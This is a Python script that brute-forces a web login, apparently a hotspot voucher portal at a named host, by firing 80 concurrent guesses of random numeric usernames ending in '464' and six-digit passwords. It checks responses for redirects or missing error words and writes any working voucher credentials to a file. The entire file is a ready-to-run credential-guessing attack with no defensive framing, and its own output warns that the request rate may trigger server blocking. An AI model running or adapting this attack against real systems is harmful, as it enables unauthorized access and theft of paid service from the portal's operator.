import asyncio
import aiohttp
import random
import string
import time
from aiohttp import ClientTimeout

# ===========================[ CONFIGURATION ]===========================
TARGET_URL = "http://q.ps/login" 
USER_FIELD = "user" 
PASS_FIELD = "pass"
RESULT_FILE = "found_vouchers.txt"
# =======================================================================

checked_vouchers = set()

def generate_vouchers():
    digits = string.digits
    while True:
        user_prefix = ''.join(random.choice(digits) for _ in range(9))
        user = f"{user_prefix}464"
        if user not in checked_vouchers:
            checked_vouchers.add(user)
            break
    pwd = ''.join(random.choice(digits) for _ in range(6))
    return user, pwd

async def check_login(session, u, p):
    timeout = ClientTimeout(total=20)
    payload = {USER_FIELD: u, PASS_FIELD: p}
    try:
        async with session.post(TARGET_URL, data=payload, timeout=timeout, allow_redirects=False) as resp:
            location = resp.headers.get('Location', '').lower()
            if resp.status == 302 or "status" in location:
                return True, u, p
            if resp.status == 200:
                html = await resp.text()
                if not any(w in html.lower() for w in ["invalid", "error", "failed", "expired"]) and "status" in str(resp.url).lower():
                    return True, u, p
    except:
        return False, u, p
    return False, u, p

async def main():
    start_time = time.time()
    print(f"🔥 HIGH-SPEED MODE | Concurrent: 80 | Memory: Active")
    print(f"⚠️ Warning: High concurrency may trigger server-side blocking.")
    
    # Connector limit set to 80
    connector = aiohttp.TCPConnector(limit=80)
    async with aiohttp.ClientSession(connector=connector) as session:
        total_attempts = 0
        while True:
            tasks = []
            for _ in range(80):
                u, p = generate_vouchers()
                tasks.append(check_login(session, u, p))
            
            results = await asyncio.gather(*tasks)
            
            for success, u, p in results:
                if success:
                    with open(RESULT_FILE, "a", encoding="utf-8") as f:
                        f.write(f"🎯 Found: {u} | {p}\n")
                    elapsed = round(time.time() - start_time, 2)
                    print(f"\n✅ [SUCCESS] Voucher Captured: {u} : {p}")
                    print(f"⏱️ Finished in {elapsed}s.")
                    return 

            total_attempts += 80
            if total_attempts % 800 == 0:
                print(f"📡 High-Speed Scan... Total: {total_attempts} | Unique Records: {len(checked_vouchers)}")
            
            await asyncio.sleep(0.5)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n🛑 Session Interrupted. Records checked: {len(checked_vouchers)}")